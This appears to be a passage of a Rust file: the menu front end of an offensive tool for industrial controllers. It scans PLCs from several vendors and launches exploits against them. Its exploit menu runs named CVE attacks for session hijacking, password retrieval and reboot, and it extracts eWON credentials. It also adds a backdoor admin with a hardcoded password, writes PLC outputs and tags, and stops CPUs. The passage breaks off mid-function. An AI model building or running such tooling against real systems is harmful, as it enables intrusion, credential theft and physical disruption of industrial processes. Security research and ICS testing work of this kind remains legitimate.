use anyhow::Result;
use colored::Colorize;
use dialoguer::{theme::ColorfulTheme, Select};
use std::io::{self, Write};

// ===================================================================
// Menu helpers
// ===================================================================

fn clear() {
    if cfg!(target_os = "windows") {
        let _ = std::process::Command::new("cmd")
            .args(["/c", "cls"])
            .status();
    } else {
        let _ = std::process::Command::new("clear").status();
    }
}

fn prompt(items: &[&str], title: &str) -> usize {
    clear();
    crate::display::print_banner();
    crate::display::print_rule(title);
    println!();

    Select::with_theme(&ColorfulTheme::default())
        .items(items)
        .default(0)
        .interact()
        .unwrap_or(items.len() - 1)
}

fn ask_ip(prompt_text: &str) -> String {
    print!("{}: ", prompt_text.cyan());
    let _ = io::stdout().flush();
    let mut line = String::new();
    let _ = io::stdin().read_line(&mut line);
    line.trim().to_string()
}

fn ask_input(prompt_text: &str, default: &str) -> String {
    print!("{} [{}]: ", prompt_text.cyan(), default.dimmed());
    let _ = io::stdout().flush();
    let mut line = String::new();
    let _ = io::stdin().read_line(&mut line);
    let trimmed = line.trim().to_string();
    if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed
    }
}

fn pause() {
    print!("\n{}", "Press [Enter] to continue".dimmed());
    let _ = io::stdout().flush();
    let mut s = String::new();
    let _ = io::stdin().read_line(&mut s);
}

fn local_ip_for(target: &str) -> String {
    use std::net::UdpSocket;
    let sock = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(_) => return "0.0.0.0".into(),
    };
    let _ = sock.connect(format!("{target}:1"));
    sock.local_addr()
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "0.0.0.0".into())
}

// ===================================================================
// Entry point
// ===================================================================

pub fn run() -> Result<()> {
    loop {
        let items = &[
            "Connect to device (auto-detect)",
            "Scan network",
            "Run exploits",
            "Quit",
        ];
        match prompt(items, "MAIN MENU") {
            0 => connect_to_device(),
            1 => menu_scan(),
            2 => menu_exploit(),
            _ => {
                println!("{}", "Goodbye.".dimmed());
                std::process::exit(0);
            }
        }
    }
}

// ===================================================================
// Connect / auto-detect flow
// ===================================================================

fn connect_to_device() {
    let ip = ask_ip("Target IP");
    if ip.is_empty() {
        crate::display::print_error("No IP provided.");
        pause();
        return;
    }

    use crate::core::autodetect::detect_device;
    let pb = crate::display::spinner_start(&format!("Detecting device at {ip}…"));
    let info = detect_device(&ip, 3);
    pb.finish_and_clear();

    if let Some(d) = info {
        let vendor = d.vendor.clone();
        crate::display::print_success(&format!("Detected: {}", vendor.to_uppercase()));
        for (k, v) in &d.fields {
            println!("  {}: {v}", k.replace('_', " "));
        }
        pause();
        menu_device(&ip, &vendor);
    } else {
        crate::display::print_warn(&format!("Could not identify device at {ip}."));
        crate::display::print_info("Select vendor manually:");
        pause();
        manual_vendor_select(&ip);
    }
}

fn manual_vendor_select(ip: &str) {
    let items = &[
        "Beckhoff TwinCAT",
        "Siemens S7",
        "Mitsubishi MELSEC",
        "Schneider Electric",
        "Phoenix Contact",
        "EtherNet/IP (CIP)",
        "Rockwell Allen-Bradley",
        "eWON Flexy",
        "Back",
    ];
    let vendor_keys = &[
        "beckhoff",
        "siemens",
        "mitsubishi",
        "schneider",
        "phoenix",
        "enip",
        "rockwell",
        "ewon",
    ];
    let idx = prompt(items, &format!("SELECT VENDOR — {ip}"));
    if idx < vendor_keys.len() {
        menu_device(ip, vendor_keys[idx]);
    }
}

// ===================================================================
// Vendor device menu
// ===================================================================

fn menu_device(ip: &str, vendor: &str) {
    loop {
        match vendor {
            "beckhoff" => {
                let items = &[
                    "Device Info",
                    "Get TwinCAT State",
                    "Set State: Run",
                    "Set State: Config",
                    "Reboot (CVE-2015-4051)",
                    "Add User (UPnP)",
                    "Back",
                ];
                match prompt(items, &format!("BECKHOFF — {ip}")) {
                    0 => beckhoff_device_info(ip),
                    1 => beckhoff_get_state(ip),
                    2 => beckhoff_set_state(ip, 5, "Run"),
                    3 => beckhoff_set_state(ip, 16, "Config"),
                    4 => beckhoff_reboot(ip),
                    5 => beckhoff_add_user(ip),
                    _ => return,
                }
            }
            "siemens" => {
                let items = &[
                    "Device Info",
                    "Read I/O",
                    "Write Outputs",
                    "Write Merkers",
                    "CPU State",
                    "Toggle CPU State",
                    "Back",
                ];
                match prompt(items, &format!("SIEMENS — {ip}")) {
                    0 => siemens_device_info(ip),
                    1 => siemens_read_io(ip),
                    2 => siemens_write_outputs(ip),
                    3 => siemens_write_merkers(ip),
                    4 => siemens_cpu_state(ip, false),
                    5 => siemens_cpu_state(ip, true),
                    _ => return,
                }
            }
            "mitsubishi" => {
                let items = &[
                    "Set State: Run",
                    "Set State: Stop",
                    "Set State: Pause",
                    "Back",
                ];
                match prompt(items, &format!("MITSUBISHI — {ip}")) {
                    0 => mitsubishi_set_state(ip, "run"),
                    1 => mitsubishi_set_state(ip, "stop"),
                    2 => mitsubishi_set_state(ip, "pause"),
                    _ => return,
                }
            }
            "schneider" => {
                let items = &[
                    "Session Hijack (CVE-2017-6026) + Info",
                    "Run PLC",
                    "Stop PLC",
                    "Flash LED",
                    "Back",
                ];
                match prompt(items, &format!("SCHNEIDER — {ip}")) {
                    0 => schneider_hijack(ip, "info"),
                    1 => schneider_hijack(ip, "start"),
                    2 => schneider_hijack(ip, "stop"),
                    3 => schneider_flash(ip),
                    _ => return,
                }
            }
            "phoenix" => {
                let items = &[
                    "Device Info",
                    "Retrieve Passwords (CVE-2016-8366)",
                    "List Tags",
                    "Read Tag Values",
                    "Write Tag Value",
                    "Control ILC 150",
                    "Control ILC 390",
                    "Back",
                ];
                match prompt(items, &format!("PHOENIX — {ip}")) {
                    0 => phoenix_device_info(ip),
                    1 => phoenix_passwords(ip),
                    2 => phoenix_list_tags(ip),
                    3 => phoenix_read_tags(ip),
                    4 => phoenix_write_tag(ip),
                    5 => phoenix_control(ip, "ilc150"),
                    6 => phoenix_control(ip, "ilc390"),
                    _ => return,
                }
            }
            "enip" | "rockwell" => {
                let items = &[
                    "Device Info (Identity)",
                    "Enumerate Tags",
                    "Read Tag",
                    "Write Tag",
                    "Back",
                ];
                match prompt(items, &format!("ROCKWELL/ENIP — {ip}")) {
                    0 => rockwell_info(ip),
                    1 => rockwell_tags(ip),
                    2 => rockwell_read_tag(ip),
                    3 => rockwell_write_tag(ip),
                    _ => return,
                }
            }
            "ewon" => {
                let items = &[
                    "Scan / Device Info",
                    "Extract Credentials (auth bypass)",
                    "Back",
                ];
                match prompt(items, &format!("eWON — {ip}")) {
                    0 => ewon_device_info(ip),
                    1 => ewon_credentials(ip),
                    _ => return,
                }
            }
            _ => {
                crate::display::print_warn(&format!("No menu for vendor: {vendor}"));
                pause();
                return;
            }
        }
        pause();
    }
}

// ===================================================================
// Scan menu
// ===================================================================

fn menu_scan() {
    loop {
        let items = &[
            "EtherNet/IP (CIP) scan",
            "eWON scan",
            "Schneider Electric scan",
            "Mitsubishi MELSEC scan",
            "Beckhoff TwinCAT scan",
            "Siemens (single IP)",
            "Rockwell Allen-Bradley (IP)",
            "Auto-detect (any IP)",
            "Back",
        ];
        match prompt(items, "SCAN MENU") {
            0 => scan_enip(),
            1 => scan_ewon(),
            2 => scan_schneider(),
            3 => scan_mitsubishi(),
            4 => scan_beckhoff(),
            5 => scan_siemens(),
            6 => scan_rockwell(),
            7 => scan_auto(),
            _ => return,
        }
        pause();
    }
}

fn ask_interface() -> Option<crate::core::network::NetworkInterface> {
    use crate::core::network::{get_interfaces, select_interface};
    let ifaces = get_interfaces();
    select_interface(&ifaces).ok()
}

fn scan_enip() {
    use crate::vendors::enip::scan;
    let mode = ask_input("Mode — (b)roadcast or specific (i)p", "b");
    if mode.starts_with('i') || mode.starts_with('I') {
        let ip = ask_ip("Target IP");
        if ip.is_empty() {
            return;
        }
        let pb = crate::display::spinner_start(&format!("Scanning {ip}…"));
        let result = scan::scan_ip(&ip, 5, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    } else {
        let iface = match ask_interface() {
            Some(i) => i,
            None => return,
        };
        let pb = crate::display::spinner_start("Broadcasting EtherNet/IP discovery…");
        let result = scan::scan(&iface, 5, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    }
}

fn scan_ewon() {
    use crate::vendors::ewon::scan;
    let mode = ask_input("Mode — (b)roadcast or specific (i)p", "b");
    if mode.starts_with('i') || mode.starts_with('I') {
        let ip = ask_ip("Target IP");
        if ip.is_empty() {
            return;
        }
        let pb = crate::display::spinner_start(&format!("Scanning {ip}…"));
        let result = scan::scan_ip(&ip, 3, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    } else {
        let iface = match ask_interface() {
            Some(i) => i,
            None => return,
        };
        let pb = crate::display::spinner_start("Broadcasting eWON IPCONF discovery…");
        let result = scan::scan(&iface, 3, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    }
}

fn scan_schneider() {
    use crate::vendors::schneider::scan;
    let mode = ask_input("Mode — (b)roadcast or specific (i)p", "b");
    if mode.starts_with('i') || mode.starts_with('I') {
        let ip = ask_ip("Target IP");
        if ip.is_empty() {
            return;
        }
        let transport_input = ask_input("Transport (both/udp/tcp)", "both");
        let transport = match transport_input.to_ascii_lowercase().as_str() {
            "udp" => scan::Transport::Udp,
            "tcp" => scan::Transport::Tcp,
            "both" => scan::Transport::Both,
            other => {
                crate::display::print_warn(&format!("Unknown transport '{other}', using both."));
                scan::Transport::Both
            }
        };
        let port = if matches!(transport, scan::Transport::Udp) {
            0
        } else {
            ask_input("Modbus TCP port", "502")
                .parse::<u16>()
                .ok()
                .filter(|port| *port != 0)
                .unwrap_or(502)
        };
        let pb = crate::display::spinner_start(&format!("Scanning {ip}..."));
        let result = scan::scan_ip_with_transport(&ip, 2, false, port, transport);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    } else {
        let iface = match ask_interface() {
            Some(i) => i,
            None => return,
        };
        let pb = crate::display::spinner_start("Broadcasting Schneider discovery (UDP 1740)…");
        let result = scan::scan(&iface, 2, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    }
}

fn scan_mitsubishi() {
    use crate::vendors::mitsubishi::scan;
    let mode = ask_input("Mode — (b)roadcast or specific (i)p", "b");
    if mode.starts_with('i') || mode.starts_with('I') {
        let ip = ask_ip("Target IP");
        if ip.is_empty() {
            return;
        }
        let transport_input = ask_input("Transport (both/udp/tcp)", "both");
        let transport = match transport_input.to_ascii_lowercase().as_str() {
            "udp" => scan::Transport::Udp,
            "tcp" => scan::Transport::Tcp,
            "both" => scan::Transport::Both,
            other => {
                crate::display::print_warn(&format!("Unknown transport '{other}', using both."));
                scan::Transport::Both
            }
        };
        let port = if matches!(transport, scan::Transport::Udp) {
            0
        } else {
            ask_input("SLMP TCP port", "5007")
                .parse::<u16>()
                .ok()
                .filter(|port| *port != 0)
                .unwrap_or(5007)
        };
        let pb = crate::display::spinner_start(&format!("Scanning {ip}…"));
        let result = scan::scan_ip_with_transport(&ip, 3, false, port, transport);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    } else {
        let iface = match ask_interface() {
            Some(i) => i,
            None => return,
        };
        let pb = crate::display::spinner_start("Broadcasting Mitsubishi MELSEC discovery…");
        let result = scan::scan(&iface, 3, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => crate::display::print_success(&format!("Found {} device(s).", devs.len())),
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    }
}

fn scan_beckhoff() {
    use crate::vendors::beckhoff::scan;
    let mode = ask_input("Mode — (b)roadcast or specific (i)p", "b");
    if mode.starts_with('i') || mode.starts_with('I') {
        let ip = ask_ip("Target IP");
        if ip.is_empty() {
            return;
        }
        let pb = crate::display::spinner_start(&format!("Scanning {ip}…"));
        let result = scan::discover_ip(&ip, 2, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => {
                for d in &devs {
                    println!("  {} — {} {}", d.ip, d.name, d.tc_version);
                }
                crate::display::print_success(&format!("Found {} device(s).", devs.len()));
            }
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    } else {
        let iface = match ask_interface() {
            Some(i) => i,
            None => return,
        };
        let pb = crate::display::spinner_start("Broadcasting Beckhoff ADS discovery (UDP 48899)…");
        let result = scan::discover(&iface, 2, false);
        pb.finish_and_clear();
        match result {
            Ok(devs) => {
                for d in &devs {
                    println!("  {} — {} {}", d.ip, d.name, d.tc_version);
                }
                crate::display::print_success(&format!("Found {} device(s).", devs.len()));
            }
            Err(e) => crate::display::print_error(&format!("{e}")),
        }
    }
}

fn scan_siemens() {
    let ip = ask_ip("Target IP");
    if ip.is_empty() {
        return;
    }
    use crate::vendors::siemens::scan;
    let pb = crate::display::spinner_start(&format!("Scanning {ip}…"));
    let result = scan::scan_ip(&ip);
    pb.finish_and_clear();
    match result {
        Ok(dev) => {
            println!("  IP:       {}", dev.ip);
            if let Some(hw) = dev.hardware {
                println!("  Hardware: {hw}");
            }
            if let Some(fw) = dev.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(cs) = dev.cpu_state {
                println!("  CPU:      {cs}");
            }
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn scan_rockwell() {
    let ip = ask_ip("Target IP");
    if ip.is_empty() {
        return;
    }
    use crate::vendors::rockwell::driver;
    let pb = crate::display::spinner_start(&format!("Connecting to {ip}…"));
    let result = driver::get_device_info(&ip, 0);
    pb.finish_and_clear();
    match result {
        Ok(dev) => {
            println!("  Vendor:       {}", dev.vendor);
            println!("  Product Name: {}", dev.product_name);
            println!("  Revision:     {}", dev.revision);
            println!("  Serial:       {}", dev.serial);
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn scan_auto() {
    let ip = ask_ip("Target IP");
    if ip.is_empty() {
        return;
    }
    use crate::core::autodetect::detect_device;
    let pb = crate::display::spinner_start(&format!("Detecting device at {ip}…"));
    let info = detect_device(&ip, 3);
    pb.finish_and_clear();
    match info {
        Some(d) => {
            crate::display::print_success(&format!("Vendor: {}", d.vendor.to_uppercase()));
            for (k, v) in &d.fields {
                println!("  {}: {v}", k.replace('_', " "));
            }
        }
        None => crate::display::print_warn(&format!("Could not identify device at {ip}")),
    }
}

// ===================================================================
// Exploit menu
// ===================================================================

fn menu_exploit() {
    loop {
        let items = &[
            "eWON Flexy credential extraction",
            "Schneider Flash LED",
            "Schneider Session Hijack (CVE-2017-6026)",
            "Phoenix Password Retrieval (CVE-2016-8366)",
            "Phoenix Tag Read/Write (CVE-2016-8380)",
            "Beckhoff CX9020 Reboot (CVE-2015-4051)",
            "Beckhoff CX9020 Add User (UPnP)",
            "Back",
        ];
        match prompt(items, "EXPLOIT MENU") {
            0 => {
                let ip = ask_ip("Target IP");
                if !ip.is_empty() {
                    ewon_credentials(&ip);
                }
            }
            1 => {
                let ip = ask_ip("Target IP");
                if !ip.is_empty() {
                    schneider_flash(&ip);
                }
            }
            2 => {
                let ip = ask_ip("Target IP");
                if !ip.is_empty() {
                    schneider_hijack(&ip, "info");
                }
            }
            3 => {
                let ip = ask_ip("Target IP");
                if !ip.is_empty() {
                    phoenix_passwords(&ip);
                }
            }
            4 => {
                let ip = ask_ip("Target IP");
                if !ip.is_empty() {
                    phoenix_write_tag(&ip);
                }
            }
            5 => {
                let ip = ask_ip("Target IP");
                if !ip.is_empty() {
                    beckhoff_reboot(&ip);
                }
            }
            6 => {
                let ip = ask_ip("Target IP");
                if !ip.is_empty() {
                    beckhoff_add_user(&ip);
                }
            }
            _ => return,
        }
        pause();
    }
}

// ===================================================================
// Beckhoff actions
// ===================================================================

fn beckhoff_discover(ip: &str) -> Option<crate::vendors::beckhoff::scan::BeckhoffDevice> {
    use crate::vendors::beckhoff::scan;
    scan::discover_ip(ip, 2, true).ok()?.into_iter().next()
}

fn beckhoff_device_info(ip: &str) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    let pb = crate::display::spinner_start(&format!("Discovering {ip}…"));
    let dev = beckhoff_discover(ip);
    pb.finish_and_clear();
    let dev = match dev {
        Some(d) => d,
        None => {
            crate::display::print_error("Device not found.");
            return;
        }
    };
    println!("  Name:     {}", dev.name);
    println!("  NetID:    {}", dev.netid_str);
    println!("  TwinCAT:  {}", dev.tc_version);
    println!("  Kernel:   {}", dev.kernel);

    let pb2 = crate::display::spinner_start("Reading full device info…");
    let info = scan::get_device_info_full(&dev, &local_netid, 0);
    pb2.finish_and_clear();
    if let Some(info) = info {
        if let Some(os) = &info.os_name {
            println!("  OS:       {os}");
        }
        if let Some(hw) = &info.hardware_model {
            println!("  Hardware: {hw}");
        }
        if let Some(serial) = &info.serial {
            println!("  Serial:   {serial}");
        }
    }
}

fn beckhoff_get_state(ip: &str) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    let pb = crate::display::spinner_start(&format!("Discovering {ip}…"));
    let dev = beckhoff_discover(ip);
    pb.finish_and_clear();
    let dev = match dev {
        Some(d) => d,
        None => {
            crate::display::print_error("Device not found.");
            return;
        }
    };
    let state = scan::get_state(&dev, &local_netid, 0);
    crate::display::print_info(&format!("TwinCAT state: {state}"));
}

fn beckhoff_set_state(ip: &str, _code: u16, name: &str) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    let pb = crate::display::spinner_start(&format!("Discovering {ip}…"));
    let dev = beckhoff_discover(ip);
    pb.finish_and_clear();
    let dev = match dev {
        Some(d) => d,
        None => {
            crate::display::print_error("Device not found.");
            return;
        }
    };
    let pb2 = crate::display::spinner_start(&format!("Setting TwinCAT state to {name}…"));
    let result = scan::set_twincat_state(&dev, &local_netid, name, 0);
    pb2.finish_and_clear();
    match result {
        Ok(_) => crate::display::print_success(&format!("State set to {name}.")),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn beckhoff_reboot(ip: &str) {
    use crate::vendors::beckhoff::webcontrol;
    let pb = crate::display::spinner_start(&format!("Sending reboot to {ip}…"));
    let result = webcontrol::reboot(ip, 0);
    pb.finish_and_clear();
    match result {
        Ok(_) => crate::display::print_success("Reboot command sent."),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn beckhoff_add_user(ip: &str) {
    let user = ask_input("Username", "scadaver_admin");
    let pass = ask_input("Password", "Sc4d4v3r!");
    use crate::vendors::beckhoff::webcontrol;
    let pb = crate::display::spinner_start(&format!("Adding user '{user}' to {ip}…"));
    let result = webcontrol::add_user(ip, 0, &user, &pass);
    pb.finish_and_clear();
    match result {
        Ok(_) => crate::display::print_success(&format!("User '{user}' creation command sent.")),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

// ===================================================================
// Siemens actions
// ===================================================================

fn siemens_device_info(ip: &str) {
    use crate::vendors::siemens::scan;
    let pb = crate::display::spinner_start(&format!("Scanning {ip}…"));
    let result = scan::scan_ip(ip);
    pb.finish_and_clear();
    match result {
        Ok(dev) => {
            println!("  IP:       {}", dev.ip);
            if let Some(hw) = dev.hardware {
                println!("  Hardware: {hw}");
            }
            if let Some(fw) = dev.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(cs) = dev.cpu_state {
                println!("  CPU:      {cs}");
            }
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn siemens_read_io(ip: &str) {
    use crate::vendors::siemens::s7comm;
    let pb = crate::display::spinner_start(&format!("Reading I/O from {ip}…"));
    let data = s7comm::read_all_data(ip, 102, 5, None);
    pb.finish_and_clear();
    let mut any = false;
    for area in &["inputs", "outputs", "merkers"] {
        if let Some(Some(bits)) = data.get(*area) {
            any = true;
            println!("  {area}:");
            let mut keys: Vec<&String> = bits.keys().collect();
            keys.sort();
            for bit in keys {
                let v = bits[bit];
                let disp = if v == 1 { "1".green() } else { "0".dimmed() };
                println!("    {bit}: {disp}");
            }
        }
    }
    if !any {
        crate::display::print_warn("No I/O data received.");
    }
}

fn siemens_write_outputs(ip: &str) {
    use crate::vendors::siemens::s7comm;
    let bits = ask_input("Binary output string", "00000000");
    let ok = s7comm::set_outputs(ip, &bits, 102, 5, None);
    if ok {
        crate::display::print_success("Outputs written.");
    } else {
        crate::display::print_error("Failed to write outputs.");
    }
}

fn siemens_write_merkers(ip: &str) {
    use crate::vendors::siemens::s7comm;
    let bits = ask_input("Binary merker string", "00000000");
    let offset_str = ask_input("Byte offset", "0");
    let offset: u32 = offset_str.parse().unwrap_or(0);
    let ok = s7comm::set_merkers(ip, &bits, offset, 102, 5, None);
    if ok {
        crate::display::print_success("Merkers written.");
    } else {
        crate::display::print_error("Failed to write merkers.");
    }
}

fn siemens_cpu_state(ip: &str, flip: bool) {
    use crate::vendors::siemens::s7comm;
    let state = s7comm::get_cpu_state(ip, 102, 5, None);
    crate::display::print_info(&format!("CPU state: {state}"));
    if flip {
        if s7comm::change_cpu_state(ip, 102, 5) {
            let new_state = s7comm::get_cpu_state(ip, 102, 5, None);
            crate::display::print_success(&format!("New state: {new_state}"));
        } else {
            crate::display::print_error("Failed to toggle CPU state.");
        }
    }
}

// ===================================================================
// Mitsubishi actions
// ===================================================================

fn mitsubishi_set_state(ip: &str, state: &str) {
    use crate::core::network::NetworkInterface;
    use crate::vendors::mitsubishi::control;
    let iface = NetworkInterface {
        name: "auto".into(),
        ip: local_ip_for(ip),
        netmask: "255.255.255.0".into(),
        mac: None,
    };
    let pb = crate::display::spinner_start(&format!("Sending {state} to Mitsubishi PLC…"));
    let result = control::set_state_ip(&iface, ip, state);
    pb.finish_and_clear();
    match result {
        Ok(true) => crate::display::print_success("Command sent."),
        Ok(false) => crate::display::print_warn("Command sent (no ack)."),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

// ===================================================================
// Schneider actions
// ===================================================================

fn schneider_flash(ip: &str) {
    use crate::vendors::schneider::flash_led;
    let pb = crate::display::spinner_start(&format!("Sending Flash LED to {ip}…"));
    let result = flash_led::flash_led_ip(ip);
    pb.finish_and_clear();
    match result {
        Ok(_) => crate::display::print_success("Flash LED command sent."),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn schneider_hijack(ip: &str, action: &str) {
    use crate::vendors::schneider::session_hijack;
    let pb = crate::display::spinner_start(&format!("Fetching session from {ip}…"));
    let session = session_hijack::get_session_cookie(ip, 0);
    pb.finish_and_clear();
    let session = match session {
        Some(s) => s,
        None => {
            crate::display::print_error("Failed to get session cookie.");
            return;
        }
    };
    crate::display::print_success(&format!(
        "Cookie: {} (booted {} times, last at {})",
        session.cookie_value, session.power_on_count, session.bootup_time
    ));
    match action {
        "info" => {
            session_hijack::get_device_info(ip, 0, &session.cookie_value, "Administrator");
        }
        a => {
            let ok = session_hijack::control_plc(ip, 0, &session.cookie_value, "Administrator", a);
            if ok {
                crate::display::print_success(&format!("PLC {a} command sent."));
            } else {
                crate::display::print_error(&format!("Failed to {a} PLC."));
            }
        }
    }
}

// ===================================================================
// Phoenix actions
// ===================================================================

fn phoenix_device_info(ip: &str) {
    use crate::vendors::phoenix::control;
    let pb = crate::display::spinner_start(&format!("Querying {ip}…"));
    let result = control::get_device_info(ip, 0, false);
    pb.finish_and_clear();
    match result {
        Ok(info) => {
            println!("  PLC Type: {}", info.plc_type);
            if let Some(fw) = info.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(b) = info.build {
                println!("  Build:    {b}");
            }
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn phoenix_passwords(ip: &str) {
    use crate::vendors::phoenix::webvisit;
    let pb = crate::display::spinner_start(&format!("Retrieving passwords from {ip}…"));
    let result = webvisit::retrieve_passwords(ip, 0);
    pb.finish_and_clear();
    match result {
        Ok(entries) if entries.is_empty() => crate::display::print_warn("No passwords retrieved."),
        Ok(entries) => {
            for e in &entries {
                if let Some(p) = &e.password {
                    println!("  User Level {}: {}", e.user_level, p.red().bold());
                } else if let Some(h) = &e.hash {
                    println!("  User Level {} [sha256]: {h}", e.user_level);
                }
            }
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn phoenix_list_tags(ip: &str) {
    use crate::vendors::phoenix::webvisit;
    match webvisit::get_tags(ip, 0) {
        Ok((project, tags)) => {
            println!("  Project: {project}");
            for (i, t) in tags.iter().enumerate() {
                println!("  [{i:>4}] {t}");
            }
            crate::display::print_success(&format!("{} tag(s).", tags.len()));
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn phoenix_read_tags(ip: &str) {
    use crate::vendors::phoenix::webvisit;
    let (_, tags) = match webvisit::get_tags(ip, 0) {
        Ok(r) => r,
        Err(e) => {
            crate::display::print_error(&format!("{e}"));
            return;
        }
    };
    match webvisit::read_tag_values(ip, 0, &tags) {
        Ok(values) => {
            for (name, val) in &values {
                println!("  {name}: {val}");
            }
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn phoenix_write_tag(ip: &str) {
    use crate::vendors::phoenix::webvisit;
    let tag_name = ask_input("Tag name", "");
    if tag_name.is_empty() {
        return;
    }
    let value = ask_input("New value", "0");
    match webvisit::write_tag_value(ip, 0, &tag_name, &value) {
        Ok(true) => crate::display::print_success(&format!("Wrote {tag_name} = {value}")),
        Ok(false) => crate::display::print_warn("Write sent (no confirmation)."),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn phoenix_control(ip: &str, model: &str) {
    use crate::vendors::phoenix::control;
    let action = ask_input("Action (cold/warm/hot/stop)", "cold");
    let pb = crate::display::spinner_start(&format!("Sending {action} to {model} at {ip}…"));
    let result = if model == "ilc390" {
        let a = if action == "stop" { "stop" } else { "start" };
        control::control_ilc390(ip, 0, a)
    } else {
        let a = if action == "stop" { "stop" } else { "start" };
        let st = match action.as_str() {
            "warm" => "warm",
            "hot" => "hot",
            _ => "cold",
        };
        control::control_ilc150(ip, 0, a, st)
    };
    pb.finish_and_clear();
    match result {
        Ok(state) => crate::display::print_success(&format!("State: {state}")),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

// ===================================================================
// Rockwell actions
// ===================================================================

fn rockwell_info(ip: &str) {
    use crate::vendors::rockwell::driver;
    let pb = crate::display::spinner_start(&format!("Connecting to {ip}…"));
    let result = driver::get_device_info(ip, 0);
    pb.finish_and_clear();
    match result {
        Ok(dev) => {
            println!("  Vendor:       {}", dev.vendor);
            println!("  Product Name: {}", dev.product_name);
            println!("  Product Code: {}", dev.product_code);
            println!("  Revision:     {}", dev.revision);
            println!("  Serial:       {}", dev.serial);
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn rockwell_tags(ip: &str) {
    use crate::vendors::rockwell::driver;
    let pb = crate::display::spinner_start(&format!("Enumerating tags on {ip}…"));
    let result = driver::enumerate_tags(ip, 0);
    pb.finish_and_clear();
    match result {
        Ok(tags) => {
            for t in &tags {
                println!(
                    "  [{:>5}] {} (type=0x{:04x})",
                    t.instance_id, t.name, t.tag_type
                );
            }
            crate::display::print_success(&format!("{} tag(s).", tags.len()));
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn rockwell_read_tag(ip: &str) {
    use crate::vendors::rockwell::driver;
    let name = ask_input("Tag name", "");
    if name.is_empty() {
        return;
    }
    let pb = crate::display::spinner_start(&format!("Reading {name}…"));
    let result = driver::read_tag(ip, 0, &name);
    pb.finish_and_clear();
    match result {
        Ok(raw) => {
            let hex: String = raw.iter().map(|b| format!("{b:02x}")).collect();
            println!("  {name} = 0x{hex}");
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn rockwell_write_tag(ip: &str) {
    use crate::vendors::rockwell::driver;
    let name = ask_input("Tag name", "");
    if name.is_empty() {
        return;
    }
    let hex_val = ask_input("Hex value (e.g. 01 for BOOL, 01000000 for DINT 1)", "01");
    let value_bytes: Vec<u8> = hex_val
        .split_whitespace()
        .flat_map(|chunk| {
            chunk
                .as_bytes()
                .chunks(2)
                .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap_or(""), 16).ok())
        })
        .collect();
    let type_code: u16 = match value_bytes.len() {
        1 => 0x00C1,
        4 => 0x00C4,
        _ => 0x00C4,
    };
    match driver::write_tag(ip, 0, &name, type_code, &value_bytes) {
        Ok(_) => crate::display::print_success(&format!("Wrote {name}.")),
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

// ===================================================================
// eWON actions
// ===================================================================

fn ewon_device_info(ip: &str) {
    use crate::vendors::ewon::scan;
    let pb = crate::display::spinner_start(&format!("Querying {ip}…"));
    let result = scan::scan_ip(ip, 3, false);
    pb.finish_and_clear();
    match result {
        Ok(devs) if devs.is_empty() => crate::display::print_warn("No eWON response."),
        Ok(devs) => {
            crate::display::print_success(&format!("{} response(s).", devs.len()));
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}

fn ewon_credentials(ip: &str) {
    use crate::vendors::ewon::exploit;
    let max_str = ask_input("Max users to probe", "20");
    let max: u32 = max_str.parse().unwrap_or(20);
    let pb = crate::display::spinner_start(&format!("Extracting credentials from {ip}…"));
